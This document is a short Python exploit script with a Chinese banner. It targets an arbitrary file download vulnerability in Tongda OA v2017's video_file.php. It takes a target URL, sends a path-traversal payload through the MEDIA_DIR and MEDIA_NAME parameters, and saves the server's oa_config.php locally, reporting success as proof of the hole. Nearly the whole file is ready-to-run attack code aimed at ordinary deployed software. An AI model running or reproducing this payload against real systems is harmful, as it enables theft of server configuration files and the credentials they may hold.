# encoding: utf-8
import requests
import sys
import argparse
import xml.etree.ElementTree as ET
import urllib.request

def get_args():
    parser=argparse.ArgumentParser(
            prog='U8OA-leak.py',description='input url to run the script')
    parser.add_argument("-u","--url",type=str,help='input url')
    parser.add_argument("-v","--version",action='version',version='%(prog)s 1.0')
    args=parser.parse_args()
    return args


def main():
    try:
        print(r"""                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/
                   *-/*-._* `.
                    /     *-.'._
                   /\       /-._*-._
                  /  ) _,-*/    *-(_)
                 / // /   /
 _     _        /    _   / _ ____                       _
| |   (_) __ _ _   _(_) __| / ___|_      _____  _ __ __| |
| |   | |/ _` | | | | |/ _` \___ \ \ /\ / / _ \| '__/ _` |
| |___| | (_| | |_| | | (_| |___) \ V  V / (_) | | | (_| |
|_____|_|\__, |\__,_|_|\__,_|____/ \_/\_/ \___/|_|  \__,_|
            |_|
         /  / /    /
        /  / / L  /
       /  / / Z  /
      /  / / J  /
     /  |,'    /
    :   /     /
    [  /   ,'
    | /  ,'
    |/,-'
    '
          """)
        print("***********************************************")
        print("*通达OA v2017 video_file.php 任意文件下载漏洞 *")
        print("*               V1.0  by 液体剑               *")
        print("***********************************************\n")

        args=get_args()
        url=args.url
        payload='/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
        filename='oa_config.php'
        req=url+payload
        #print(req)
        try:
            urllib.request.urlretrieve(req, filename)
            print('\033[32m[+] 存在漏洞，下载成功！\033[0m')
        except Exception as e:
            print('\033[0;31;40m[-] 不存在漏洞...\033[0m', e)
    except:
        print('\033[0;31;40mERROR!\033[0m')

if __name__=="__main__":
    get_args()
    main()
